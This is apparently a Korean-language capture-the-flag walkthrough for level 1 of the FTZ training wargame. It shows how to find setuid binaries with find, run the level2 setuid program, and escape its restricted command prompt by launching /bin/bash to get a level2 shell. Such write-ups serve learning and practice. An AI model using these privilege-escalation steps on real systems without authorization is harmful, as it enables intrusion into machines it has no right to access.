# 01. Level1

우선, 현재 경로의 파일과 디렉토리들을 봅시다.

    [level1@ftz level1]$ ls -al
    (생략)
    -rw-r--r--    1 root     root           47 Apr  4  2000 hint
    (생략)

그 중 hint라는 파일이 있네요! 한번 열어봅시다.

    [level1@ftz level1]$ cat hint

    level2 권한에 setuid가 걸린 파일을 찾는다.

level2 권한에 setuid가 걸린 파일은 아래의 명령어를 사용하면 손쉽게 찾을 수 있습니다.

    [level1@ftz level1]$ find / -user level2 -perm -4000

find를 이용하면 Permission denied 가 뜨지 않는 한 개의 경로가 나옵니다.
이제 그 경로를 이용한다면 루트 권한을 획득할 수 있습니다!!

우선 그 알아낸 경로로 이동해봅시다

    [level1@ftz level1]$ cd /bin/ExcuteMe
    -bash: cd: /bin/ExcuteMe: Not a directory

위의 경로가 디렉토리가 아니라는 메시지가 떴네요.
그렇다면 ExcuteMe는 `디렉토리가 아니다` 라는 추측을 할 수 있습니다.

이번엔 bin까지만 이동한 후 ExcuteMe를 찾아봅시다.

    [level1@ftz level1]$ cd /bin
    [level1@ftz level1]$ ls ExcuteMe

ExcuteMe는 실행파일이었네요!!
그렇다면 아래와 같이`./`로 실행시켜 봅시다.

    [level1@ftz level1]$ ./ExcuteMe

ExcutMe파일을 실행시키자 다음과 같은 문구가 뜨네요!

    레벨2의 권한으로 당신이 원하는 명령어를
    한가지 실행시켜 드리겠습니다.
    (단, my-pass 와 chmod는 제외)

    어떤 명령을 실행시키겠습니까?

    [level2@ftz level2]$ 

my-pass를 입력할 수 있는 기회가 온 듯 했지만 
호락호락하게 권한을 주진 않네요.
하지만 우리에겐 또 한가지 방법이 있습니다!

바로 /bin/bash로 이동하는 것이죠.

/bin/bash로 이동하게 되면 이제 우리는 my-pass를 입력할 수 있습니다!!